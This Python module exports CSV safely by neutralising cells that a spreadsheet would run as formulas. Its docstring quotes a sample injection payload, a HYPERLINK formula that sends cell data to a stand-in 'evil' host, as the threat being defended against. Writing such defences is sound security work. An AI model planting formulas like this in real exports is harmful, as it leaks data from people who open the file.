"""CSV export that is safe to open in Excel, LibreOffice and Google Sheets.

A text cell that starts with = + - @ (or a tab or carriage return) is run as a formula by a
spreadsheet, so a customer name like `=HYPERLINK("http://evil/?"&A1,"x")` or a DDE string would
execute on the person who opens the export. Such text cells get a leading apostrophe, which the
spreadsheet shows as nothing and treats as "this is text". Real numbers are left alone, so a
negative amount stays a number; a TEXT column holding "-5" is prefixed, which is the safe side.
"""

from __future__ import annotations

import csv
import io
from typing import Any

_TRIGGERS = ("=", "+", "-", "@", "\t", "\r", "\n")
_SKIP = " \t\r\n\x00\x0b\x0c ﻿​"


def neutralise(v: Any) -> Any:
    if isinstance(v, str):
        stripped = v.lstrip(_SKIP)
        if stripped.startswith(_TRIGGERS) or v.startswith(_TRIGGERS):
            return "'" + v
    return v


def to_csv(columns: list[str], rows: list[list[Any]]) -> str:
    """UTF-8 text with a byte-order mark's worth of intent: callers prepend \ufeff so Excel
    reads Urdu and accented names correctly."""
    out = io.StringIO()
    w = csv.writer(out, lineterminator="\r\n")
    w.writerow([neutralise(str(c)) for c in columns])
    for r in rows:
        w.writerow([neutralise(v) for v in r])
    return out.getvalue()
